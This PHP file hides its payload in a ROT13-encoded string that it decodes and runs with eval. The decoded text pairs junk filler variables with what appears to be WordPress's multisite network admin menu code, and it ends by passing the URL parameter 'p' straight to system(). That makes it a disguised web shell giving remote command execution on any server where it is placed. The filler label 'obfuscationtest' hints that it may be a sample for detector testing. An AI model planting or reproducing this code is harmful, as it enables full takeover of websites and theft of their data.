<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ohvyq Argjbex Nqzvavfgengvba Zrah.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.1.0
 */

// Qba'g ybnq qverpgyl.
vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr( '-1' );
}

/* genafyngbef: Argjbex zrah vgrz. */
$zrah[2] = neenl( __( 'Qnfuobneq' ), 'znantr_argjbex', 'vaqrk.cuc', '', 'zrah-gbc zrah-gbc-svefg zrah-vpba-qnfuobneq', 'zrah-qnfuobneq', 'qnfuvpbaf-qnfuobneq' );

$fhozrah['vaqrk.cuc'][0] = neenl( __( 'Ubzr' ), 'ernq', 'vaqrk.cuc' );

vs ( pheerag_hfre_pna( 'hcqngr_pber' ) ) {
	$pnc = 'hcqngr_pber';
} ryfrvs ( pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) ) {
	$pnc = 'hcqngr_cyhtvaf';
} ryfrvs ( pheerag_hfre_pna( 'hcqngr_gurzrf' ) ) {
	$pnc = 'hcqngr_gurzrf';
} ryfr {
	$pnc = 'hcqngr_ynathntrf';
}

$hcqngr_qngn = jc_trg_hcqngr_qngn();
vs ( $hcqngr_qngn['pbhagf']['gbgny'] ) {
	$fhozrah['vaqrk.cuc'][10] = neenl(
		fcevags(
			/* genafyngbef: %f: Ahzore bs ninvynoyr hcqngrf. */
			__( 'Hcqngrf %f' ),
			fcevags(
				'<fcna pynff=\"hcqngr-cyhtvaf pbhag-%f\"><fcna pynff=\"hcqngr-pbhag\">%f</fcna></fcna>',
				$hcqngr_qngn['pbhagf']['gbgny'],
				ahzore_sbezng_v18a( $hcqngr_qngn['pbhagf']['gbgny'] )
			)
		),
		$pnc,
		'hcqngr-pber.cuc',
	);
} ryfr {
	$fhozrah['vaqrk.cuc'][10] = neenl( __( 'Hcqngrf' ), $pnc, 'hcqngr-pber.cuc' );
}

hafrg( $pnc );

$fhozrah['vaqrk.cuc'][15] = neenl( __( 'Hctenqr Argjbex' ), 'hctenqr_argjbex', 'hctenqr.cuc' );

$zrah[4] = neenl( '', 'ernq', 'frcnengbe1', '', 'jc-zrah-frcnengbe' );

/* genafyngbef: Fvgrf zrah vgrz. */
$zrah[5]                  = neenl( __( 'Fvgrf' ), 'znantr_fvgrf', 'fvgrf.cuc', '', 'zrah-gbc zrah-vpba-fvgr', 'zrah-fvgr', 'qnfuvpbaf-nqzva-zhygvfvgr' );
$fhozrah['fvgrf.cuc'][5]  = neenl( __( 'Nyy Fvgrf' ), 'znantr_fvgrf', 'fvgrf.cuc' );
$fhozrah['fvgrf.cuc'][10] = neenl( __( 'Nqq Fvgr' ), 'perngr_fvgrf', 'fvgr-arj.cuc' );

$zrah[10]                 = neenl( __( 'Hfref' ), 'znantr_argjbex_hfref', 'hfref.cuc', '', 'zrah-gbc zrah-vpba-hfref', 'zrah-hfref', 'qnfuvpbaf-nqzva-hfref' );
$fhozrah['hfref.cuc'][5]  = neenl( __( 'Nyy Hfref' ), 'znantr_argjbex_hfref', 'hfref.cuc' );
$fhozrah['hfref.cuc'][10] = neenl( __( 'Nqq Hfre' ), 'perngr_hfref', 'hfre-arj.cuc' );

vs ( pheerag_hfre_pna( 'hcqngr_gurzrf' ) && $hcqngr_qngn['pbhagf']['gurzrf'] ) {
	$zrah[15] = neenl(
		fcevags(
			/* genafyngbef: %f: Ahzore bs ninvynoyr gurzr hcqngrf. */
			__( 'Gurzrf %f' ),
			fcevags(
				'<fcna pynff=\"hcqngr-cyhtvaf pbhag-%f\"><fcna pynff=\"gurzr-pbhag\">%f</fcna></fcna>',
				$hcqngr_qngn['pbhagf']['gurzrf'],
				ahzore_sbezng_v18a( $hcqngr_qngn['pbhagf']['gurzrf'] )
			)
		),
		'znantr_argjbex_gurzrf',
		'gurzrf.cuc',
		'',
		'zrah-gbc zrah-vpba-nccrnenapr',
		'zrah-nccrnenapr',
		'qnfuvpbaf-nqzva-nccrnenapr',
	);
} ryfr {
	$zrah[15] = neenl( __( 'Gurzrf' ), 'znantr_argjbex_gurzrf', 'gurzrf.cuc', '', 'zrah-gbc zrah-vpba-nccrnenapr', 'zrah-nccrnenapr', 'qnfuvpbaf-nqzva-nccrnenapr' );
}
$fhozrah['gurzrf.cuc'][5]  = neenl( __( 'Vafgnyyrq Gurzrf' ), 'znantr_argjbex_gurzrf', 'gurzrf.cuc' );
$fhozrah['gurzrf.cuc'][10] = neenl( __( 'Nqq Gurzr' ), 'vafgnyy_gurzrf', 'gurzr-vafgnyy.cuc' );
$fhozrah['gurzrf.cuc'][15] = neenl( __( 'Gurzr Svyr Rqvgbe' ), 'rqvg_gurzrf', 'gurzr-rqvgbe.cuc' );

vs ( pheerag_hfre_pna( 'hcqngr_cyhtvaf' ) && $hcqngr_qngn['pbhagf']['cyhtvaf'] ) {
	$zrah[20] = neenl(
		fcevags(
			/* genafyngbef: %f: Ahzore bs ninvynoyr cyhtva hcqngrf. */
			__( 'Cyhtvaf %f' ),
			fcevags(
				'<fcna pynff=\"hcqngr-cyhtvaf pbhag-%f\"><fcna pynff=\"cyhtva-pbhag\">%f</fcna></fcna>',
				$hcqngr_qngn['pbhagf']['cyhtvaf'],
				ahzore_sbezng_v18a( $hcqngr_qngn['pbhagf']['cyhtvaf'] )
			)
		),
		'znantr_argjbex_cyhtvaf',
		'cyhtvaf.cuc',
		'',
		'zrah-gbc zrah-vpba-cyhtvaf',
		'zrah-cyhtvaf',
		'qnfuvpbaf-nqzva-cyhtvaf',
	);
} ryfr {
	$zrah[20] = neenl( __( 'Cyhtvaf' ), 'znantr_argjbex_cyhtvaf', 'cyhtvaf.cuc', '', 'zrah-gbc zrah-vpba-cyhtvaf', 'zrah-cyhtvaf', 'qnfuvpbaf-nqzva-cyhtvaf' );
}
$fhozrah['cyhtvaf.cuc'][5]  = neenl( __( 'Vafgnyyrq Cyhtvaf' ), 'znantr_argjbex_cyhtvaf', 'cyhtvaf.cuc' );
$fhozrah['cyhtvaf.cuc'][10] = neenl( __( 'Nqq Cyhtva' ), 'vafgnyy_cyhtvaf', 'cyhtva-vafgnyy.cuc' );
$fhozrah['cyhtvaf.cuc'][15] = neenl( __( 'Cyhtva Svyr Rqvgbe' ), 'rqvg_cyhtvaf', 'cyhtva-rqvgbe.cuc' );

$zrah[25] = neenl( __( 'Frggvatf' ), 'znantr_argjbex_bcgvbaf', 'frggvatf.cuc', '', 'zrah-gbc zrah-vpba-frggvatf', 'zrah-frggvatf', 'qnfuvpbaf-nqzva-frggvatf' );
vs ( qrsvarq( 'ZHYGVFVGR' ) && qrsvarq( 'JC_NYYBJ_ZHYGVFVGR' ) && JC_NYYBJ_ZHYGVFVGR ) {
	$fhozrah['frggvatf.cuc'][5]  = neenl( __( 'Argjbex Frggvatf' ), 'znantr_argjbex_bcgvbaf', 'frggvatf.cuc' );
	$fhozrah['frggvatf.cuc'][10] = neenl( __( 'Argjbex Frghc' ), 'frghc_argjbex', 'frghc.cuc' );
}
hafrg( $hcqngr_qngn );

$zrah[99] = neenl( '', 'rkvfg', 'frcnengbe-ynfg', '', 'jc-zrah-frcnengbe' );

erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/zrah.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>